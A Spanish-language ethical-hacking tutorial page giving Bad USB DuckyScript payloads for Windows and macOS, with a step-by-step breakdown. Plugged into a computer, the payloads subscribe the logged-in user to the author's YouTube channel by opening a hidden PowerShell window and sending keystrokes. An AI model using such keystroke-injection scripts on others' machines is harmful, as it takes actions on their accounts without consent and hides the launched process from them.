
# Script básico de Youtube

## <mark style="color:orange;">Video del Script</mark>

{% embed url="<https://youtu.be/NtT9L91VPUU?si=A7AqeiuGPCopd4Hp>" %}

## <mark style="color:orange;">Script Bad USB</mark>

Podemos utilizar el siguiente script en formato DuckyScript:

### Para Windows

{% code title="youtube-follow-win.txt" %}

```bash
REM Autor: afsh4ck
REM Title: Youtube Follow Windows
REM Script para seguir automáticamente un canal de YouTube en Windows
DELAY 500

GUI r
DELAY 500
STRING powershell -NoP -NonI -W Hidden -Command "Start-Process 'https://www.youtube.com/@afsh4ck?sub_confirmation=1'"
ENTER
DELAY 4000
REM Espera a que cargue la página

TAB
DELAY 500
TAB
DELAY 500
ENTER
```

{% endcode %}

### Para MacOS

{% code title="youtube-follow-mac.txt" %}

```bash
REM Autor: afsh4ck
REM Title: Youtube Follow macOS
REM Script para seguir automáticamente un canal de YouTube en macOS

DELAY 500

GUI SPACE
DELAY 500
STRING chrome
ENTER
DELAY 2000
STRING https://www.youtube.com/@afsh4ck?sub_confirmation=1
ENTER
DELAY 4000
REM Espera a que cargue la página

TAB
DELAY 500
TAB
DELAY 500
ENTER
```

{% endcode %}

### Desglose del comando

```python
# Espera de medio segundo antes de ejecutar el comando

REM Script para seguir automáticamente un canal de YouTube
DELAY 500
```

```bash
# Abre la terminal y espera medio segundo

GUI r
DELAY 500
```

```bash
# Ejecuta powershell o abre chrome para abrir Youtube y pulsar enter

STRING powershell -NoP -NonI -W Hidden -Command "Start-Process 'https://www.youtube.com/@afsh4ck?sub_confirmation=1'"
ENTER
```

{% hint style="success" %}
Al añadir al final `?sub_confirmation=1` llevamos al usuario a la página de suscripción, en la que aparece el popup de suscribirse o cancelar
{% endhint %}

```bash
# Espera hasta que cargue la página

DELAY 4000
```

Al abrir esta URL: [`https://www.youtube.com/@afsh4ck?sub_confirmation=1`](https://www.youtube.com/@afsh4ck?sub_confirmation=1) vemos que abre directamente el popup de suscripción.&#x20;

<figure><img src="/files/de06jYc1tutRCa9OBuka" alt=""><figcaption></figcaption></figure>

Necesitamos darle 2 veces a tabulador para llegar al CTA de confirmar, por lo que se lo indicaremos en el script:

```bash
TAB
DELAY 250
TAB
DELAY 250
ENTER
```

{% hint style="success" %}
Si el usuario ya se hubiera logueado en Youtube anteriormente en ese equipo directamente se suscribiría de manera automática al canal.
{% endhint %}

***

## <mark style="color:orange;">Sígueme en YouTube</mark>

Si te ha gustado esta técnica no dudes en seguirme en YouTube, donde subo contenido gratuíto y de calidad sobre hacking ético, el Flipper Zero y otros dispositivos de hacking. Nos vemos dentro hacker!

{% embed url="<https://www.youtube.com/@afsh4ck?sub_confirmation=1>" %}
